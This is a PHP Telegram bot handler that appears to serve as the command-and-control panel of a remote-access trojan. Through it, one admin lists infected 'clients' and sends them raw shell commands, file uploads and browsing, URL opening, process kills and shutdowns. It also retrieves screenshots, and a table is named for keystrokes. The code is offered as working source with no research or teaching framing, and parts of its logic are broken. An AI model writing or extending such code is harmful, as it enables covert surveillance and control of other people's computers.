<?php
require_once 'config.php';
require_once 'utils.php';

class TelegramHandler
{
    public static function handle_telegram_update($pdo, $crypto, $update)
    {
        $chat_id = $update['message']['chat']['id'] ?? $update['callback_query']['from']['id'] ?? 0;

        if (!self::is_authorized($chat_id)) {
            self::send_telegram_message($chat_id, "Access denied. Only the authorized admin can use this bot.");
            return;
        }

        if (isset($update['callback_query'])) {
            self::process_callback($pdo, $crypto, $update['callback_query']);
        } elseif (isset($update['message'])) {
            self::process_message($pdo, $crypto, $update['message']);
        }

        self::log_update($update);
    }

    private static function is_authorized($chat_id)
    {
        return $chat_id == Config::$ADMIN_CHAT_ID;
    }

    private static function process_message($pdo, $crypto, $message)
    {
        $chat_id = $message['chat']['id'];
        $text = $message['text'] ?? '';

        if (!empty($text)) {
            $stmt = $pdo->prepare("
                INSERT INTO user_typelogs (chat_id, keystrokes, created_at)
                VALUES (?, ?, NOW())
            ");
            $stmt->execute([$chat_id, $text]);
        }

        if (isset($message['document'])) {
            self::handle_file_upload($pdo, $crypto, $message);
            return;
        }

        switch ($text) {
            case '/start':
                self::show_client_list($pdo, $chat_id);
                break;
            case '/cmd':
                self::send_telegram_message($chat_id, "Please send the raw command.");
                break;
            case '/screens':
                self::show_screenshots($pdo, $chat_id);
                break;
            case '/logs':
                self::show_logs($chat_id);
                break;
            case '/browse':
                self::send_command($pdo, $crypto, $chat_id, 'file_operation', ['action' => 'list']);
                break;
            case '/get-info':
                self::send_command($pdo, $crypto, $chat_id, 'system_info', []);
                break;
            case '/go':
                self::send_telegram_message($chat_id, "Please send the URL to open.");
                break;
            case '/users':
                self::show_client_list($pdo, $chat_id);
                break;
            case '/shutdown':
            case '/restart':
            case '/sleep':
            case '/signout':
                self::send_command($pdo, $crypto, $chat_id, 'system_command', ['command' => substr($text, 1)]);
                break;
            case '/startup':
            case '/tasks':
                self::send_command($pdo, $crypto, $chat_id, 'process_management', ['action' => $text === '/startup' ? 'list' : 'list']);
                break;
            default:
                if (strpos($text, '/cmd ') === 0) {
                    self::send_command($pdo, $crypto, $chat_id, 'raw_command', ['command' => substr($text, 5)]);
                } elseif (strpos($text, '/go ') === 0) {
                    self::send_command($pdo, $crypto, $chat_id, 'open_url', ['url' => substr($text, 4)]);
                } else {
                    self::send_telegram_message($chat_id, "Unknown command. Use /start to begin.");
                }
        }
    }

    private static function process_callback($pdo, $crypto, $callback)
    {
        $chat_id = $callback['from']['id'];
        $data = json_decode($callback['data'], true);
        $client_id = $data['client_id'] ?? '';
        $action = $data['action'] ?? '';

        if ($action === 'select_client') {
            self::show_access_menu($pdo, $chat_id, $client_id);
        } elseif ($action === 'terminate_process') {
            self::send_command($pdo, $crypto, $chat_id, 'process_management', [
                'action' => 'terminate',
                'pid' => $data['pid']
            ]);
        }
    }

    private static function show_client_list($pdo, $chat_id)
    {
        $stmt = $pdo->prepare("
    SELECT client_id, last_seen FROM users 
    WHERE last_seen > DATE_SUB(NOW(), INTERVAL 1 HOUR)
");
        $stmt->execute();
        $clients = $stmt->fetchAll(PDO::FETCH_ASSOC);

        if (!$clients) {
            self::send_telegram_message($chat_id, "No online clients found.");
            return;
        }

        $keyboard = ['inline_keyboard' => []];
        foreach ($clients as $client) {
            // اضافه کردن هر کلاینت به عنوان یک ردیف مجزا
            $keyboard['inline_keyboard'][] = [ // <-- هر کلاینت یک ردیف جدید
                [
                    'text' => $client['client_id'] . ' (' . $client['last_seen'] . ')',
                    'callback_data' => json_encode([
                        'action' => 'select_client',
                        'client_id' => $client['client_id']
                    ])
                ]
            ];
        }

        self::send_telegram_message(
            $chat_id,
            "Select a client:",
            ['reply_markup' => json_encode($keyboard)] // <-- فراموش نشود!
        );
    }

    private static function show_access_menu($pdo, $chat_id, $client_id)
    {
        $keyboard = ['inline_keyboard' => [
            [['text' => 'Get Info', 'callback_data' => json_encode(['action' => 'get_info', 'client_id' => $client_id])]],
            [['text' => 'Browse Files', 'callback_data' => json_encode(['action' => 'browse', 'client_id' => $client_id])]],
            [['text' => 'Shutdown', 'callback_data' => json_encode(['action' => 'shutdown', 'client_id' => $client_id])]],
            [['text' => 'Restart', 'callback_data' => json_encode(['action' => 'restart', 'client_id' => $client_id])]],
        ]];

        self::send_telegram_message($chat_id, "Access menu for client $client_id:", ['reply_markup' => $keyboard]);
    }

    private static function show_screenshots($pdo, $chat_id)
    {
        $stmt = $pdo->prepare("SELECT screenshot_path FROM client_data WHERE screenshot_path IS NOT NULL ORDER BY received_at DESC LIMIT 5");
        $stmt->execute();
        $screenshots = $stmt->fetchAll(PDO::FETCH_ASSOC);

        foreach ($screenshots as $screenshot) {
            self::send_telegram_message($chat_id, null, ['photo' => curl_file_create($screenshot['screenshot_path'])]);
        }
    }

    private static function show_logs($chat_id)
    {
        if (file_exists(Config::$ERROR_LOG)) {
            $logs = file_get_contents(Config::$ERROR_LOG);
            self::send_telegram_message($chat_id, "Error logs:\n" . htmlspecialchars($logs));
        } else {
            self::send_telegram_message($chat_id, "No logs found.");
        }
    }

    private static function send_command($pdo, $crypto, $chat_id, $type, $params)
    {
        $client_id = Utils::sanitize_input($params['client_id'] ?? '');
        $command = ['type' => $type, 'params' => $params];

        $stmt = $pdo->prepare("
            INSERT INTO commands (client_id, command, status, created_at)
            VALUES (?, ?, 'pending', NOW())
        ");
        $stmt->execute([$client_id, $crypto->encrypt(json_encode($command))]);

        self::send_telegram_message($chat_id, "Command sent to client $client_id.");
    }

    private static function handle_file_upload($pdo, $crypto, $message)
    {
        $chat_id = $message['chat']['id'];
        $file_id = $message['document']['file_id'];
        $file = self::get_telegram_file($file_id);

        $file_path = Config::$UPLOAD_DIR . $message['document']['file_name'];
        file_put_contents($file_path, $file);

        self::send_command($pdo, $crypto, $chat_id, 'file_operation', [
            'action' => 'upload',
            'path' => $file_path
        ]);
    }

    private static function get_telegram_file($file_id)
    {
        $url = "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/getFile?file_id=$file_id";
        $response = json_decode(file_get_contents($url), true);
        $file_path = $response['result']['file_path'];
        return file_get_contents("https://api.telegram.org/file/bot" . Config::$BOT_TOKEN . "/$file_path");
    }

    public static function send_telegram_message($chat_id, $text, $options = [])
    {
        $url = "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/sendMessage";
        $data = [
            'chat_id' => $chat_id,
            'text' => $text,
            'parse_mode' => 'HTML',
            'reply_markup' => $options['reply_markup'] ?? null // <-- این خط
        ];

        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_RETURNTRANSFER => true,
        ]);
        $response = curl_exec($ch);
        file_put_contents(
            Config::$TELEGRAM_LOG,
            "Telegram API Response: " . print_r($response, true),
            FILE_APPEND
        );
    }

    private static function log_update($update)
    {
        file_put_contents(Config::$TELEGRAM_LOG, json_encode($update, JSON_UNESCAPED_UNICODE) . PHP_EOL, FILE_APPEND);
    }
}
